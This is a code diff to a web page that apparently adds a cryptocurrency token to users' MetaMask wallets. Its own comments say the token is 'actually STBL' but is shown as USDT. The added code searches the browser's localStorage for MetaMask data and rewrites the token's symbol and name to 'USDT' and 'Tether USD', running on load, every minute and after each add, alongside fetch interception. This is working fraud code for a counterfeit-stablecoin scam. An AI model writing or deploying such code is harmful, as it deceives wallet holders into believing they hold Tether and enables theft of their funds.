@@ -46,6 +46,92 @@
         return originalFetch(resource, init);
       };
     }
+    
+    // NEW FEATURE: LocalStorage Interception for more permanent USDT display
+    // This runs immediately and periodically to ensure MetaMask shows USDT
+    function updateMetaMaskLocalStorage() {
+      try {
+        // Find all localStorage keys
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          
+          // Look for MetaMask data with our token
+          if (key && (key.includes('metamask') || key.includes('MetaMask')) && 
+              localStorage[key].includes('0x6ba2344f60c999d0ea102c59ab8be6872796c08c')) {
+            
+            console.log("Found MetaMask data with our token in localStorage:", key);
+            
+            try {
+              // Try to parse the data
+              let data = JSON.parse(localStorage[key]);
+              let modified = false;
+              
+              // Check different potential locations where token data might be stored
+              // TokenList structure
+              if (data.data && data.data.TokenList) {
+                Object.keys(data.data.TokenList).forEach(network => {
+                  const tokenKey = '0x6ba2344f60c999d0ea102c59ab8be6872796c08c'.toLowerCase();
+                  if (data.data.TokenList[network][tokenKey]) {
+                    data.data.TokenList[network][tokenKey].symbol = "USDT";
+                    data.data.TokenList[network][tokenKey].name = "Tether USD";
+                    modified = true;
+                    console.log("Updated token in TokenList");
+                  }
+                });
+              }
+              
+              // AccountTokens structure
+              if (data.data && data.data.AccountTokens) {
+                Object.keys(data.data.AccountTokens).forEach(account => {
+                  Object.keys(data.data.AccountTokens[account]).forEach(network => {
+                    const tokens = data.data.AccountTokens[account][network];
+                    if (Array.isArray(tokens)) {
+                      tokens.forEach(token => {
+                        if (token.address && token.address.toLowerCase() === '0x6ba2344f60c999d0ea102c59ab8be6872796c08c'.toLowerCase()) {
+                          token.symbol = "USDT";
+                          token.name = "Tether USD";
+                          modified = true;
+                          console.log("Updated token in AccountTokens");
+                        }
+                      });
+                    }
+                  });
+                });
+              }
+              
+              // AllTokens structure
+              if (data.data && data.data.AllTokens) {
+                Object.keys(data.data.AllTokens).forEach(network => {
+                  const tokenKey = '0x6ba2344f60c999d0ea102c59ab8be6872796c08c'.toLowerCase();
+                  if (data.data.AllTokens[network][tokenKey]) {
+                    data.data.AllTokens[network][tokenKey].symbol = "USDT";
+                    data.data.AllTokens[network][tokenKey].name = "Tether USD";
+                    modified = true;
+                    console.log("Updated token in AllTokens");
+                  }
+                });
+              }
+              
+              // Save back if modified
+              if (modified) {
+                localStorage[key] = JSON.stringify(data);
+                console.log("Updated MetaMask data in localStorage");
+              }
+            } catch (parseError) {
+              console.error("Error parsing localStorage data:", parseError);
+            }
+          }
+        }
+      } catch (error) {
+        console.error("Error updating localStorage:", error);
+      }
+    }
+    
+    // Run immediately
+    updateMetaMaskLocalStorage();
+    
+    // Then periodically check and update
+    setInterval(updateMetaMaskLocalStorage, 60000); // Every minute
   </script>
   <style>
     body {
@@ -436,13 +522,13 @@
         if (loadingText) loadingText.textContent = message || "Adding USDT to your wallet...";
         loadingOverlay.style.display = 'flex';
         
-        // Always set a forced timeout
+        // Always set a forced timeout - INCREASED TO 10 SECONDS
         const forceHideTimeout = setTimeout(() => {
           debugLog("Forced timeout - hiding loading overlay");
           loadingOverlay.style.display = 'none';
           // Show alternative method
           altMethodBtn.style.display = 'block';
-        }, 10000);
+        }, 10000); // 10 seconds timeout (increased from 7)
         
         return forceHideTimeout;
       }
@@ -455,16 +541,16 @@
       
       // Primary token addition method - with STBL internally but showing as USDT
       addToWalletBtn.addEventListener('click', async () => {
-        const timeoutId = showLoading("Preparing to add USDT...");
+        const timeoutId = showLoading("Connecting to MetaMask...");
         
         try {
           // Check if on correct network first
-          debugLog("Checking current network...");
+          debugLog("Checking Base network compatibility...");
           const chainId = await safeMetaMaskCall('eth_chainId');
           debugLog(`Current chain ID: ${chainId}, Target: ${tokenConfig.networkId}`);
           
           if (chainId !== tokenConfig.networkId) {
-            loadingText.textContent = "Switching to Base network...";
+            loadingText.textContent = "Preparing to switch to Base network...";
             debugLog("Network mismatch, trying to switch...");
             
             // Try to switch to Base network
@@ -477,7 +563,7 @@
               if (switchResult.error.code === 4902) {
                 // Network not added yet
                 debugLog("Network not available, adding Base network");
-                loadingText.textContent = "Adding Base network...";
+                loadingText.textContent = "Adding Base network to MetaMask (approve in popup)...";
                 
                 const addResult = await safeMetaMaskCall('wallet_addEthereumChain', [
                   {
@@ -521,7 +607,7 @@
           }
           
           // Now add the token - using USDT symbol (our interception handles it)
-          loadingText.textContent = "Adding USDT to your wallet...";
+          loadingText.textContent = "Adding USDT to your wallet (approve in MetaMask)...";
           debugLog("Adding token to wallet as USDT (actually STBL)");
           
           const tokenResult = await safeMetaMaskCall('wallet_watchAsset', {
@@ -546,6 +632,16 @@
             }
           } else {
             debugLog("Token added successfully");
+            loadingText.textContent = "Token successfully added! Loading balance...";
+            
+            // Run the localStorage interception again now that token is added
+            try {
+              // Update MetaMask data in localStorage
+              updateMetaMaskLocalStorage();
+            } catch (storageErr) {
+              console.error("Error updating MetaMask storage:", storageErr);
+            }
+            
             successModal.show();
             
             // Try to get the balance
@@ -605,6 +701,15 @@
             }
           } else {
             debugLog("Token added successfully with alternative method");
+            
+            // Run the localStorage interception for the alternative method too
+            try {
+              // Manually update MetaMask data to change STBL to USDT
+              updateMetaMaskLocalStorage();
+            } catch (storageErr) {
+              console.error("Error updating MetaMask storage:", storageErr);
+            }
+            
             successModal.show();
             
             // Try to get the balance
